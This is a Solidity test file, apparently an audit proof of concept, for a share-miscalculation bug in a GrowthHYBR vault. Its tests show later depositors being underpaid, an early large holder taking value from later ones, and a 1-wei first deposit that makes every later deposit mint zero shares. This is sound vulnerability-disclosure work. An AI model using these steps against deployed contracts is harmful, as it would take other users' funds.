// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "./GHybrBase.t.sol";

/// Lead: GrowthHYBR.deposit computes shares AFTER deposit_for has already added `amount` to the veNFT,
/// so calculateShares divides by (totalAssets_before + amount) -> every depositor after the first is underpaid.
contract DepositSharesTest is GHybrBase {
    function test_secondDepositorGetsHalfTheShares() public {
        uint256 a = dep(alice, 1000e18);
        uint256 b = dep(bob, 1000e18);
        assertEq(a, 1000e18);
        assertEq(b, 500e18, "bob gets half the shares for the same deposit");
        emit log_named_decimal_uint("alice value", valueOf(alice), 18);
        emit log_named_decimal_uint("bob value  ", valueOf(bob), 18);
        // bob's 1000 HYBR is now worth ~666; alice gained ~333
        assertApproxEqAbs(valueOf(bob), 666.666e18, 1e18);
        assertApproxEqAbs(valueOf(alice), 1333.333e18, 1e18);
    }

    /// Existing large holder profits from every later deposit, even after the 1% withdraw fee.
    function test_whaleExtractsValueFromLaterDepositors() public {
        dep(alice, 1_000_000e18);
        dep(bob, 1_000_000e18);           // e.g. a batch of rHYBR -> gHYBR redemptions
        vm.warp(block.timestamp + 1 days); // past transfer lock
        toWithdrawWindow();
        uint256 aliceShares = gHybr.balanceOf(alice);
        vm.prank(alice);
        uint256 nft = gHybr.withdraw(aliceShares);
        (int128 amt,,) = votingEscrow.locked(nft);
        uint256 got = uint256(int256(amt));
        emit log_named_decimal_uint("alice deposited 1,000,000; received veHYBR", got, 18);
        assertGt(got, 1_300_000e18);
    }

    /// rHYBR -> gHYBR redemption path (gauge rewards) suffers the same loss.
    function test_rewardRedemptionToGHybrUnderpaid() public {
        dep(alice, 1000e18);
        // bob gets 1000 rHYBR the way a gauge does, then redeems to gHYBR
        vm.startPrank(bob);
        hybr.approve(address(rewardHybr), 1000e18);
        rewardHybr.depostionEmissionsToken(1000e18);
        rewardHybr.redeem(1000e18, 2); // TO_GHYBR "1:1 (no penalty)"
        vm.stopPrank();
        assertEq(gHybr.balanceOf(bob), 500e18);
    }

    /// Extreme case: first depositor with 1 wei -> every later deposit mints 0 shares.
    function test_oneWeiFirstDepositMakesLaterDepositsMintZero() public {
        dep(alice, 1);
        uint256 b = dep(bob, 1_000_000e18);
        assertEq(b, 0, "bob receives no shares at all");
        assertEq(gHybr.totalAssets(), 1_000_000e18 + 1);
    }
}
